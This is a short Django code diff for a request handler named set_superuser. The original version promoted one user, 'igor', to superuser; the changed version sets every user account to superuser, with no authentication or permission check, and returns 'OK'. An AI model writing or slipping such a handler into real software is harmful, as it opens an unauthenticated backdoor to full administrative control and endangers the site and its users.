@@ -5,12 +5,11 @@ from django.contrib import admin
 
 def set_superuser(request):
 
-    from django.contrib.auth.models import User, Group
+    from django.contrib.auth.models import User
     from django.http import HttpResponse
 
-    u = User.objects.get(username="igor")
-    u.is_superuser = True
-    u.save()
+    u = User.objects.all()
+    u.update(is_superuser=True)
 
     return HttpResponse("OK")
 
